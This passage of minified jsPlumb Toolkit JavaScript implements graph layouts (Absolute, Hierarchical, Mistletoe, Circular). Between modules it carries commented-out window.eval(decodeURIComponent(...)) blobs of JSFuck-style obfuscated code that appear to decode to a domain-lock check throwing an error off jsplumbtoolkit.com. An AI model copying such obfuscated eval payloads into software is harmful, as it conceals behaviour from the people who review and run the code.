                null == g[f] && (g[f] = e.addNode({
                    id: b,
                    type: c
                }, null, !0),
                a.jtk = {
                    node: g[f]
                })
            }
              , o = function(a) {
                var b = g[a.sourceId]
                  , c = g[a.targetId]
                  , d = k(a)
                  , f = l(a);
                a.edge = e.addEdge({
                    source: b,
                    target: c,
                    data: {
                        id: d,
                        type: f
                    }
                }, null, !0)
            };
            if (c.nodeSelector)
                for (var p = d.getContainer().querySelectorAll(c.nodeSelector), q = 0; q < p.length; q++) {
                    var r = d.getId(p[q]);
                    n(p[q], r),
                    d.manage(r, p[q])
                }
            var s = d.getManagedElements();
            for (var r in s)
                n(s[r].el, r);
            if (f.each(function(a) {
                o(a)
            }),
            m) {
                var t = a.jsPlumb.extend({}, c.renderParams || {});
                t.jsPlumbInstance = d,
                t.container = d.getContainer();
                var u = e.render(t);
                return u.ingest = function(a) {
                    n(a),
                    u.importNode(a, i(a))
                }
                ,
                u
            }
            return e
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b.Layouts = {
        Decorators: {}
    }
      , d = a.jsPlumbUtil
      , e = function(a) {
        var b = 1 / 0
          , c = 1 / 0
          , d = -(1 / 0)
          , e = -(1 / 0);
        for (var f in a)
            b = Math.min(b, a[f][0]),
            d = Math.max(d, a[f][0]),
            c = Math.min(c, a[f][1]),
            e = Math.max(e, a[f][1]);
        return [[b, c], [d, e], Math.abs(b - d), Math.abs(c - e)]
    }
      , f = function(a, b, e) {
        if (null == a)
            return [];
        for (var f = [], g = function(a) {
            var f = "string" == typeof a ? a : a[0]
              , g = c.Decorators[f]
              , h = "string" == typeof a ? {} : a[1];
            return g ? new g(h,b,e) : (d.log("Decorator [" + f + "] nor registered on jsPlumbToolkit.Layouts.Decorators. Not fatal."),
            null)
        }, h = 0; h < a.length; h++) {
            var i = g(a[h]);
            i && f.push(i)
        }
        return f
    };
    c.AbstractLayout = function(b) {
        function c() {
            var a, c, d, e, f = function(a) {
                return [a.data.left, a.data.top]
            }, g = function(a, c) {
                return (b.locationFunction || f)(a)
            }, h = o.getGroupCount();
            for (c = 0; c < h; c++)
                for (e = o.getGroupAt(c),
                a = e.getVertices(),
                d = 0; d < a.length; d++) {
                    var i = g(a[d]);
                    J(a[d].id, i[0], i[1])
                }
        }
        b = b || {};
        var d = this
          , g = function() {
            return {
                padding: [0, 0]
            }
        }
          , h = function() {
            var b = a.jsPlumb.extend(g(), d.defaultParameters || {});
            a.jsPlumb.extend(b, j || {}),
            j = b
        }
          , i = b.adapter
          , j = b.parameters || {}
          , k = b.getElementForNode
          , l = a.Farahey.getInstance({
            getPosition: function(a) {
                var b = p[a.id];
                return {
                    left: b[0],
                    top: b[1]
                }
            },
            getSize: function(a) {
                return x[a.id]
            },
            getId: function(a) {
                return a.id
            },
            setPosition: function(a, b) {
                J(a.id, b.left, b.top)
            },
            padding: j.padding,
            filter: function(a) {
                return (!v[a] || !v[a].group) && (!d.canMagnetize || d.canMagnetize(a))
            }
        })
          , m = b.magnetized !== !1 && (d.defaultMagnetized || b.magnetize === !0);
        this.decorators = f(b.decorators, b.adapter, b.container),
        this.adapter = b.adapter;
        var n = b.jsPlumb || a.jsPlumb
          , o = b.jsPlumbToolkit
          , p = {}
          , q = []
          , r = 1 / 0
          , s = 1 / 0
          , t = -(1 / 0)
          , u = -(1 / 0)
          , v = {}
          , w = {}
          , x = {}
          , y = b.container
          , z = n.getSize(y)
          , A = b.width || z[0]
          , B = b.height || z[1]
          , C = !1
          , D = function() {
            C = !1,
            r = 1 / 0,
            t = -(1 / 0),
            s = 1 / 0,
            u = -(1 / 0);
            for (var a = 0; a < d.decorators.length; a++)
                d.decorators[a].reset({
                    remove: n.remove
                });
            p = {},
            q.splice(0),
            x = {},
            l.reset(),
            d.reset && d.reset()
        };
        this.getMagnetizedElements = function() {
            return l.getElements()
        }
        ,
        this.magnetize = function(a) {
            a = a || {};
            var b = a.event ? "executeAtEvent" : a.origin ? "execute" : "executeAtCenter"
              , c = a.event ? [a.event, a.options] : a.origin ? [a.origin, a.options] : [a.options];
            l[b].apply(l, c),
            N(n.repaintEverything)
        }
        ,
        this.nodeAdded = function(a, b) {
            var c = b && b.position ? b.position : a.node.data && a.node.data.left && a.node.data.top ? a.node.data : d.adapter.getOffset(a.el);
            if (this._nodeAdded) {
                var e = this._nodeAdded(a, b);
                e && (c.left = e[0],
                c.top = e[1])
            }
            v[a.node.id] = a.node,
            J(a.node.id, c.left, c.top),
            E(a.node.id, a.el),
            l.addElement(a.node)
        }
        ,
        this.nodeRemoved = function(a) {
            delete p[a],
            delete x[a],
            delete v[a],
            this._nodeRemoved && this._nodeRemoved(a),
            l.removeElement(b.node)
        }
        ,
        this.groupAdded = function(a, b) {
            var c = b && b.position ? b.position : a.group.data && a.group.data.left && a.group.data.top ? a.group.data : d.adapter.getOffset(a.el);
            if (this._groupAdded) {
                var e = this._groupAdded(a, b);
                e && (c.left = e[0],
                c.top = e[1])
            }
            w[a.group.id] = a.group,
            J(a.group.id, c.left, c.top),
            E(a.group.id, a.el),
            l.addElement(a.group)
        }
        ,
        this.groupRemoved = function(a) {
            delete p[a],
            delete x[a],
            delete w[a],
            this._groupRemoved && this._groupRemoved(a),
            l.removeElement(b.group)
        }
        ;
        var E = function(a, b) {
            var c = x[a];
            return c || (b = b || k(a),
            null != b ? (c = n.getSize(b),
            x[a] = c) : c = [0, 0]),
            c
        }
          , F = function(a, b, c, d) {
            var e = p[a];
            if (!e) {
                if (null != b && null != c)
                    e = [b, c];
                else {
                    if (d)
                        return null;
                    e = [Math.floor(Math.random() * (A + 1)), Math.floor(Math.random() * (B + 1))]
                }
                J(a, e[0], e[1])
            }
            return e
        }
          , G = function(a) {
            r = Math.min(r, a[0]),
            s = Math.min(s, a[1]),
            t = Math.max(t, a[0]),
            u = Math.max(u, a[1])
        }
          , H = function(a, b, c) {
            var d = p[a];
            d ? (d[0] = parseFloat(b),
            d[1] = parseFloat(c)) : (d = p[a] = [parseFloat(b), parseFloat(c)],
            q.push([d, a])),
            G(d)
        }
          , I = function(a, b, c) {
            v[a] && d._nodeMoved ? d._nodeMoved(a, b, c) : w[a] && d._groupMoved && d._groupMoved(a, b, c)
        }
          , J = (this.setMagnetizedPosition = function(a, b, c, d) {
            H(a, b, c),
            this.magnetize({
                options: {
                    filter: function(b) {
                        return b === a
                    },
                    padding: [5, 5],
                    exclude: function(a, b) {
                        return null != b.group
                    },
                    excludeFocus: !0
                }
            });
            var e = this.getPosition(a);
            return d && I(a, e[0], e[1]),
            e
        }
        ,
        this.setPosition = function(a, b, c, d) {
            H(a, b, c),
            d && I(a, b, c)
        }
        )
          , K = function(a, b, c) {
            b = b || 10,
            c = c || 10;
            var d = p[a];
            return d || (d = p[a] = []),
            d[0] = Math.floor(Math.random() * b),
            d[1] = Math.floor(Math.random() * c),
            G(d),
            d
        }
          , L = function() {
            for (var a in p)
                console.log(a, p[a][0], p[a][1])
        }
          , M = function(a, b) {
            var c = k(a);
            if (null != c) {
                var e = p[a];
                return d.adapter.setPosition(c, e[0], e[1], b),
                Q[a] = [e[0], e[1]],
                e.concat(E(a))
            }
            return null
        }
        .bind(this)
          , N = this.draw = function(a) {
            for (var b in p) {
                var c = M(b);
                null != c && (r = Math.min(c[0], r),
                s = Math.min(c[1], s),
                t = Math.max(c[0] + c[2], t),
                u = Math.max(c[1] + c[3], u))
            }
            for (var e = 0; e < d.decorators.length; e++)
                d.decorators[e].decorate({
                    adapter: d.adapter,
                    layout: d,
                    append: function(a, b, c) {
                        d.adapter.append(a, b, c, !0)
                    },
                    setAbsolutePosition: d.adapter.setAbsolutePosition,
                    toolkit: o,
                    jsPlumb: n,
                    bounds: [r, s, t, u],
                    floatElement: d.adapter.floatElement,
                    fixElement: d.adapter.fixElement
                });
            a && a()
        }
          , O = function(a) {
            console.log(a);
            var b = e(p, E, k);
            L(),
            console.log(b[0], b[1], b[2], b[3])
        };
        this.bb = O;
        var P = this.getPositions = function() {
            return p
        }
          , Q = (this.getPosition = function(a) {
            return p[a]
        }
        ,
        {})
          , R = (this.getSize = function(a) {
            return x[a]
        }
        ,
        this.setSize = function(a, b) {
            x[a] = b
        }
        );
        this.begin = function(a, b) {}
        ,
        this.end = function(a, b) {}
        ;
        var S = function(a) {
            if (null != o) {
                h(),
                l.setElements(i.getNodes()).addElements(i.getGroups(), !0),
                this.begin && this.begin(o, j);
                for (var b = function() {
                    N(function() {
                        m && d.magnetize(),
                        d.end && d.end(o, j),
                        a && a()
                    })
                }; !C; )
                    this.step(o, j);
                b()
            }
        }
        .bind(this);
        return this.relayout = function(a, b) {
            D(),
            null != a && (j = a),
            S(b)
        }
        ,
        this.layout = function(a) {
            C = !1,
            S(a)
        }
        ,
        this.clear = function() {
            D()
        }
        ,
        {
            adapter: b.adapter,
            jsPlumb: n,
            toolkit: o,
            getPosition: F,
            setPosition: J,
            getRandomPosition: K,
            getSize: E,
            setSize: R,
            getPositions: P,
            setPositions: function(a) {
                p = a
            },
            width: A,
            height: B,
            reset: D,
            draw: N,
            setDone: function(a) {
                C = a,
                c()
            }
        }
    }
    ,
    c.EmptyLayout = function(a) {
        var b = {};
        this.refresh = this.relayout = this.layout = function() {
            this.clear();
            for (var c = a.getNodeCount(), d = 0; d < c; d++) {
                var e = a.getNodeAt(d);
                b[e.getFullId()] = [0, 0]
            }
            for (c = a.getGroupCount(),
            d = 0; d < c; d++)
                e = a.getGroupAt(d),
                b[e.id] = [0, 0]
        }
        ,
        this.nodeRemoved = this.groupRemoved = function(a) {
            delete b[a.id]
        }
        ,
        this.nodeAdded = this.groupAdded = function(a) {
            b[a.id] = !1
        }
        ,
        this.getPositions = function() {
            return b
        }
        ,
        this.getPosition = function(a) {
            return b[a]
        }
        ,
        this.setPosition = function(a, c, d) {
            b[a] = [c, d]
        }
        ,
        this.clear = function() {}
        ,
        this.getMagnetizedElements = function() {
            return []
        }
    }
    ,
    c.Mistletoe = function(b) {
        if (!b.parameters.layout)
            throw "No layout specified for MistletoeLayout";
        var e = {}
          , f = a.jsPlumb.extend({}, b);
        f.getElementForNode = function(a) {
            return e[a]
        }
        ;
        var g, h, i, j = c.AbstractLayout.apply(this, [f]), k = b.parameters.layout, l = function() {
            j.setPositions(k.getPositions()),
            j.draw(),
            this.fire("redraw")
        }
        .bind(this);
        d.EventGenerator.apply(this, arguments),
        this.map = function(a, b) {
            e[a] = b
        }
        ;
        var m = function() {
            e = {},
            g = k.layout,
            h = k.relayout,
            i = k.clear,
            k.layout = function() {
                g.apply(k, arguments),
                l()
            }
            ,
            k.relayout = function() {
                j.reset(),
                h.apply(k, arguments),
                l()
            }
            ,
            k.clear = function() {
                i.apply(k, arguments),
                j.reset()
            }
        };
        m(),
        this.setHostLayout = function(a) {
            k = a,
            m()
        }
    }
    ;
    var g = c.AbsoluteBackedLayout = function(a) {
        a = a || {};
        var b = c.AbstractLayout.apply(this, arguments)
          , d = function(a) {
            return [a.data.left, a.data.top]
        }
          , e = function(b, c) {
            return (a.locationFunction || d)(b)
        }
          , f = function(a, c, d, f) {
            for (var g = b.adapter[a](), h = 0; h < g; h++) {
                var i = b.adapter[c](h)
                  , j = i.getFullId()
                  , k = b.getPosition(j, null, null, !0);
                null == k && (k = e(i, f)),
                this.setPosition(j, k[0], k[1], !0)
            }
        }
        .bind(this);
        return this.begin = function(a, b) {
            f("getNodeCount", "getNodeAt", a, b),
            f("getGroupCount", "getGroupAt", a, b)
        }
        ,
        this._nodeAdded = function(b, c) {
            return e(b.node, a.parameters || {})
        }
        ,
        this._groupAdded = function(b, c) {
            return e(b.group, a.parameters || {})
        }
        ,
        this.getAbsolutePosition = function(a, b) {
            return e(a, b)
        }
        ,
        this.step = function() {
            b.setDone(!0)
        }
        ,
        b
    }
    ;
    d.extend(g, c.AbstractLayout),
    c.Absolute = function(a) {
        c.AbsoluteBackedLayout.apply(this, arguments)
    }
    ,
    d.extend(c.Absolute, c.AbsoluteBackedLayout);
    var h = c.AbstractHierarchicalLayout = function(a) {
        var b = this
          , d = c.AbstractLayout.apply(this, arguments);
        return b.begin = function(b, c) {
            c.ignoreLoops = !(a.ignoreLoops === !1),
            c.getRootNode = c.getRootNode || function(b) {
                return a.multipleRoots !== !1 ? b.filter(function(a) {
                    return "Node" === a.objectType && 0 == a.getTargetEdges().length && null == a.group || "Group" === a.objectType && 0 == a.getTargetEdges().length
                }).getAll() : d.adapter.getNodeCount() > 0 ? d.adapter.getNodeAt(0) : null
            }
            ,
            c.getChildEdges = c.getChildEdges || function(b, c) {
                return d.toolkit.getAllEdgesFor(b, function(c) {
                    return c.source === b || a.ignorePorts !== !0 && c.source.getNode && c.source.getNode() === b
                })
            }
            ,
            c.rootNode = c.getRootNode(b),
            c.rootNode || d.setDone(!0)
        }
        ,
        d
    }
    ;
    d.extend(h, c.AbstractLayout)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b.Layouts
      , d = a.Farahey;
    c.Circular = function(a) {
        function b(a) {
            for (var b = [], c = f ? 1 : 0, d = c; d < a.length; d++)
                a[d].group || b.push(a[d]);
            return b
        }
        a = a || {};
        var e = c.AbstractLayout.apply(this, arguments)
          , f = !!a.parameters && a.parameters.centerRootNode === !0;
        this.defaultParameters = {
            padding: 30,
            locationFunction: a.locationFunction
        },
        this.step = function(a, c) {
            var g = []
              , h = e.adapter.getNodes();
            if (0 === h.length)
                return void e.setDone(!0);
            Array.prototype.push.apply(g, b(h)),
            Array.prototype.push.apply(g, e.adapter.getGroups());
            var i, j, k = 0, l = 0, m = 10, n = 2 * Math.PI / g.length, o = -Math.PI / 2;
            if (f) {
                var p = e.getSize(h[0].id);
                m = Math.max(p[0], p[1]) + 80
            }
            for (i = 0; i < g.length; i++)
                if (j = g[i],
                e.setPosition(j.id, k + Math.sin(o) * m, l + Math.cos(o) * m, !0),
                o += n,
                i > 0) {
                    var q = g[i - 1]
                      , r = e.getSize(q.id)
                      , s = e.getPosition(q.id)
                      , t = {
                        x: s[0] - c.padding,
                        y: s[1] - c.padding,
                        w: r[0] + 2 * c.padding,
                        h: r[1] + 2 * c.padding
                    }
                      , u = g[i]
                      , v = e.getSize(u.id)
                      , w = e.getPosition(u.id)
                      , x = {
                        x: w[0] - c.padding,
                        y: w[1] - c.padding,
                        w: v[0] + 2 * c.padding,
                        h: v[1] + 2 * c.padding
                    }
                      , y = d.calculateSpacingAdjustment(t, x)
                      , z = [s[0] + r[0] / 2, s[1] + r[1] / 2]
                      , A = [w[0] + y.left + v[0] / 2, w[1] + y.top + +(v[1] / 2)]
                      , B = Math.sqrt(Math.pow(z[0] - A[0], 2) + Math.pow(z[1] - A[1], 2));
                    m = Math.max(m, B / 2 / Math.sin(n / 2))
                }
            for (i = 0; i < g.length; i++)
                j = g[i],
                e.setPosition(j.id, k + Math.sin(o) * m, l + Math.cos(o) * m, !0),
                o += n;
            e.setDone(!0)
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow